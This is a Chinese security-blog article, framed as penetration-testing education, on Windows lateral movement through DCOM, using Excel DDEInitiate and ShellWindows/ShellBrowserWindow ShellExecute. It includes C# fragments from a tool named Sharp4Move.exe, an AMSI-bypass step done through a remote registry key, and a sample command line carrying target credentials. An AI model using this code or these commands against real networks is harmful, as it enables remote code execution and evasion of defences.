---
title: DCOM 技术内网实战，通过 ExcelDDE 和 ShellBrowserWindow 实现横向移动
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247498360&idx=1&sn=8ee091f555c386b755c5300547ac08fe&chksm=fa595495cd2edd832583640b60f915e352d7d6d9eb98f85963e41303ca492d2bcb869dfcdb3b&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2025-01-22
fetch_date: 2025-10-06T20:10:39.604205
---

# DCOM 技术内网实战，通过 ExcelDDE 和 ShellBrowserWindow 实现横向移动

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9PFDpDvKwTXJc0F7cwmEa4toLcl82ja0hzYjvhDQaUiaSHRic4U8nuibCYZdxgvpIdLhibG6zlNZF45g/0?wx_fmt=jpeg)

# DCOM 技术内网实战，通过 ExcelDDE 和 ShellBrowserWindow 实现横向移动

原创

专攻.NET安全的

dotNet安全矩阵

![](https://mmbiz.qpic.cn/mmbiz_gif/NO8Q9ApS1YibJO9SDRBvE01T4A1oYJXlTBTMvb7KbAf7z9hY3VQUeayWI61XqQ0ricUQ8G1FykKHBNwCqpV792qg/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp)

这篇文章将介绍如何利用 .NET 中的 ExcelDDE 技术，通过 DCOM 实现远程命令执行。ExcelDDE是一种用于在 Excel 和其他应用程序之间交换数据的协议，ShellBrowserWindow 是一个通过 ShellExecute 方法来执行命令的接口，通常用来启动外部程序或脚本。在某些安全测试和渗透测试场景中，这两种技术可以被用来执行远程命令，绕过安全措施并与远程计算机交互。

**01. ExcelDDE 概述**

在渗透测试中，攻击者可以利用多种技术进行远程命令执行。其中，通过 DCOM 技术，可以远程创建和调用对象来执行命令，而 ExcelDDE 是 DCOM 技术的一种应用，允许通过 Excel 启动命令。

## 1.1 DDE

DDE 是 Microsoft 提供的另一项技术，允许应用程序间进行数据交换。Excel 本身支持 DDE，通过 Excel.Application 对象，攻击者可以利用 DDE 协议在 Excel 与其他应用程序之间传递命令。这种协议可以让攻击者在不直接交互的情况下，间接执行远程命令。

以下是利用 Excel.Application 对象和 DDEInitiate 方法，通过 DCOM 实现远程命令执行的代码。

```
```
bool flag4 = Method.ToLower() == "exceldde";
if (flag4)
{
    Console.WriteLine("[+] Executing DCOM ExcelDDE   : {0}", host);
    Type typeFromProgID2 = Type.GetTypeFromProgID("Excel.Application", host);
    object obj11 = Activator.CreateInstance(typeFromProgID2);
    obj11.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, obj11, new object[] { false });
    obj11.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, obj11, new object[] { text3, text2 });
}
```
```

代码使用 Type.GetTypeFromProgID 方法通过 Excel.Application 创建一个 Excel 应用程序的 COM 对象。host 是目标计算机的地址或名称，表示远程执行的目标。

```
```
Type typeFromProgID2 = Type.GetTypeFromProgID("Excel.Application", host);
object obj11 = Activator.CreateInstance(typeFromProgID2);
```
```

Activator.CreateInstance 动态创建了 Excel 应用程序的实例，最后使用 DDEInitiate 方法初始化 DDE 连接，text3 和 text2 分别是要传递的参数，具体代码如下所示。

```
```
obj11.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, obj11, new object[] { text3, text2 });
```
```

DDEInitiate 方法是 Excel 提供的用来启动 DDE 连接的接口，它会与其他程序建立连接并交换数据。利用这一方法，攻击者可以通过 Excel 发起远程命令执行。

**02. ShellBrowser**

ShellBrowserWindow 和 DCOM 是执行远程操作的关键工具。通过 ShellExecute 方法，我们能够在远程计算机上执行命令。以下是代码的详细分析，展示了如何利用 DCOM 调用和 ShellBrowserWindow 来执行远程命令。

```
```
bool flag23 = dictionary["action"].ToLower() == "dcom";
if (flag23)
{
    bool flag24 = dictionary.ContainsKey("computername") && dictionary.ContainsKey("command");
    if (flag24)
    {
        string[] array7 = dictionary["computername"].Split(new char[] { ',' });
        foreach (string host4 in array7)
        {
            string method = "ShellBrowserWindow";
            bool flag25 = dictionary.ContainsKey("method");
            if (flag25)
            {
                method = dictionary["method"];
            }

            bool flag26 = dictionary.ContainsKey("eventname");
            if (flag26)
            {
                string text6 = dictionary["eventname"];
            }

            bool flag27 = dictionary.ContainsKey("amsi") && dictionary["amsi"] == "true";
            if (flag27)
            {
                ManagementScope managementScope3 = Program.WMIConnect(host4, username, password);
                List<ManagementBaseObject> outParams3 = Program.SetRegKey(managementScope3);
                Thread.Sleep(2000);
                Program.RemoteDCOM(host4, dictionary["command"], method);
                Thread.Sleep(2000);
                Program.UnsetRegKey(managementScope3, outParams3);
            }
            else
            {
                Program.RemoteDCOM(host4, dictionary["command"], method);
            }
        }
    }
}
```
```

首先，代码检查是否为 dcom 操作，如果有多个目标主机，程序将使用 Split 方法将其分割，并对每个主机执行相同的操作。随后，代码再次检查执行方法是否为 ShellWindows。如果是，将执行 ShellExecute 方法来启动命令。

```
```
bool flag = Method.ToLower() == "shellwindows";
if (flag)
{
    Console.WriteLine("[+] Executing DCOM ShellWindows   : {0}", host);
    string g = "9BA05972-F6A8-11CF-A442-00A0C90A8F39";
    Type typeFromCLSID = Type.GetTypeFromCLSID(new Guid(g), host);
    object obj = Program.NewMethod(typeFromCLSID);
    object obj2 = obj.GetType().InvokeMember("Item", BindingFlags.InvokeMethod, null, obj, new object[0]);
    object obj3 = obj2.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj2, null);
    object obj4 = obj3.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, obj3, null);
    obj4.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, obj4, new object[] { text3, text2, text, null, 0 });
}
```
```

上述代码中9BA05972-F6A8-11CF-A442-00A0C90A8F39 是 CLSID，代码通过 Type.GetTypeFromCLSID 方法动态获取该类型。最后，通过反射调用 ShellExecute 方法来执行命令。参数包括要执行的命令以及其他配置。

**03. 工具实战操作**

Sharp4Move.exe 便是这样一款基于 .NET 实现的，结合了 DCOM 和其他攻击技术，支持从一台已入侵的主机向网络中其他计算机远程执行命令。通过该工具，渗透测试人员可以模拟攻击者在网络内的横向移动。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9PFDpDvKwTXJc0F7cwmEa4OI6q78RUk34muc0ibWxM9c1XkXadZicE7uhficr5zDhhsAmhbVC6XfDog/640?wx_fmt=jpeg&from=appmsg)

## 3.1 工具用法

以下是 Sharp4Move.exe 的一个典型使用场景。通过命令行输入参数，可以指定目标主机和要执行的命令：

```
```
Sharp4Move.exe action=create computername=PC-20201112PLZR command="C:\windows\system32\winver.exe" amsi=true username=ivan1ee password=123456
```
```

此处的action，指定要执行的操作，通常是 create，表示在目标计算机上执行命令，参数command，表示要在目标计算机上执行的命令或程序路径，运行后如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y9PFDpDvKwTXJc0F7cwmEa4ApV9hjbYUjK9iaeGHMFLt2ia7KibVLeTN56ToxHSHaUibdZv20xOSOXPWA/640?wx_fmt=png&from=appmsg)

目标计算机使用指定的用户名和密码进行身份验证，再通过 DCOM 执行命令在远程主机PC-20201112PLZR 上启动 winver.exe 进程。

## 3.2 小结

综上，Sharp4Move.exe 是一款强大的横向移动工具，利用 Windows 的 DCOM 技术，支持跨多台计算机执行命令。不仅能够绕过 AMSI 防护，还能帮助渗透测试人员模拟攻击者在企业网络中的横向移动行为，文章涉及的工具已打包在星球，感兴趣的朋友可以加入自取。

**04. 技术精华内容**

从漏洞分析到安全攻防，我们涵盖了 .NET 安全各个关键方面，为您呈现最新、最全面的 .NET 安全知识，下面是公众号发布的精华文章集合，推荐大伙阅读！

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8TQhCZMggf71ffibqISJ8f5naPJacnjn0roDyxxnAibmuwDJq2p1GTBpicZhnM9o9gTIu9S9ia8Uqwtw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&retryload=1&tp=webp)](https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247497498&idx=2&sn=00900a0c29c85b41fe6a586d7e5c3571&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9tl26Kh2sQYI9guTCflSwQP8Gs9z7iamicOvlQv4UYzjwd378D03h7yEYFtZ6xA74qicInoed7qpBWg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247495167&idx=1&sn=9280c55fdc7c9146e549be470cf9f120&chksm=fa594312cd2eca04bfe8fd1fd3890b389d9c700b9b69d897f919addac399bab4f4d2e55f6b4f&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOeP3ichLEiafhGiawd8mjkHYBalO37fN8QQkNdic1hjjY2Nvw2Bib6UvibDRA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490722&idx=2&sn=c9807daa5548e139a0c67303cb26882a&chksm=fa5ab24fcd2d3b59a85be03e69c655ffd644e8458bc2ec3f572da4b40b43e5003fda756f35b4&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOjWgak8cI7Mic1wTt3YSKqsbLl9rPe0cF9WGtOEuiceLreTNtNVib6IKlw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490703&idx=2&sn=e7db1ff662e5b41d9a1806fbdf33e204&chksm=fa5ab262cd2d3b7470f029b9a07d1dd3611e63be910b01a601144efe7d84b5f016f488a354cf&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxO8jJ97qqWlY6XR03DqSnutcHFYibDtVG5Y2wEaK4p2bzEicZblY4oQyGg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490700&idx=2&sn=e8a865ada7c743e77fb9e953c5da74b1&chksm=fa5ab261cd2d3b7736387eddfc8524a378a1604552d0c9b55476646f9e8275f48818aab8acad&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOe1viaia4aoFceunsUdIna4DPbmemW1EqlBMrovOoE6bdAFF3iaApxz5qA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488736&idx=2&sn=d24aaa297c51eb620ccdf67af513086d&chksm=fa5aba0dcd2d331bbb22f3f5657199d718c90efed42fcb9cb67ec23d34...